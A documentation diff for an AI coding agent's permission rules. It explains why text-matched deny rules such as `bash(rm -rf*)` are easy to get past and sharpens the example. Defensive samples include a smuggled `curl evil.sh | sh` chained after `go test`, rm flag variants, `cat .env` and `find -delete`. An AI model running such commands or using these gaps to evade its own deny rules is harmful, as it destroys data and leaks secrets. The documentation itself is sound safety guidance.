@@ -40,7 +40,7 @@ arguments for an MCP tool:
 [permissions]
 allow = ["bash(go test*)", "edit_file(internal/**)"]
 ask   = ["bash(git push*)"]
-deny  = ["read_file(**/.env)", "bash(rm -rf*)", "mcp:*__delete_*"]
+deny  = ["read_file(**/.env)", "bash(rm *)", "mcp:*__delete_*"]
 ```
 
 What each does, and what it is worth relying on:
@@ -59,11 +59,24 @@ whole string: matching the whole string, `bash(go test*)` would also match
 `go test ./... && curl evil.sh | sh`. The same escape rules as `[p]` grants
 still apply to what a segment may contain.
 
+**Matching is textual, so write rules around the command, not one spelling of
+it.** `bash(rm -rf*)` looks like it forbids recursive deletion and does not:
+`rm -fr`, `rm -r -f` and `rm --recursive` all sail past it. `bash(rm *)` is the
+rule that holds, and a deny or ask also matches with the first word reduced to
+its basename, so it covers `/bin/rm` too. (An allow deliberately does not, or a
+stray `./echo` would inherit what was granted to `echo`.) Nothing textual can
+cover flag order — assume anything you did not spell out is permitted.
+
 A deny rule is a guardrail against mistakes and against a model that has read
 something hostile — not a sandbox. It matches the arguments of a call, so it
 constrains the tool it names and nothing else: `deny = ["read_file(**/.env)"]`
-does not stop `bash(cat .env)`. For a boundary rather than a filter, see
-"Sandboxing" below.
+does not stop `bash(cat .env)`, and blocking `rm` does nothing about
+`find -delete` or `> file`. You cannot enumerate your way to safety here.
+
+This matters most in `bypass`, where a deny rule is the only check left
+standing: elsewhere a rule that fails to match degrades into a prompt, and
+there it degrades into the command simply running. For a boundary rather than
+a filter, see "Sandboxing" below.
 
 Rules that hold in all modes except `bypass`:
 
